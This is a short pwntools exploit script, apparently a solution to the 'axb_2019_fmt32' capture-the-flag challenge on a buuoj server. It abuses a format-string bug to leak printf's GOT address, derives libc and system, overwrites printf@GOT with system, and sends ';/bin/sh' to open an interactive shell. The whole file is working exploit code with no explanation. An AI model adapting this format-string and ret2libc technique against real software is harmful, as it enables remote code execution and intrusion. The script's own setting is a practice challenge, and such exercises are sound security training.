#Made by fly_autumn
#x86 fmt+ret2libc
from pwn import *
#p = process("./axb_2019_fmt32")
p = remote("node5.buuoj.cn",29032)
elf = ELF("./axb_2019_fmt32")
context(os="linux",arch="i386")
libc = ELF("./libc.so.6")

printf_got = elf.got["printf"]

p.recvuntil(b"Please tell me:")
p.send(b"B" + p32(printf_got) + b"%8$s")
p.recvuntil(b"\x08")
printf_addr = u32(p.recv(4))
log.success("printf addr: "+hex(printf_addr))
libc_addr = printf_addr - libc.sym["printf"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))

payload = b"A" + fmtstr_payload(offset=8,writes={printf_got:sys_addr},write_size="byte",numbwritten=10)
p.recvuntil(b"Please tell me:")
p.send(payload)
p.send(b";/bin/sh\x00")

p.interactive()
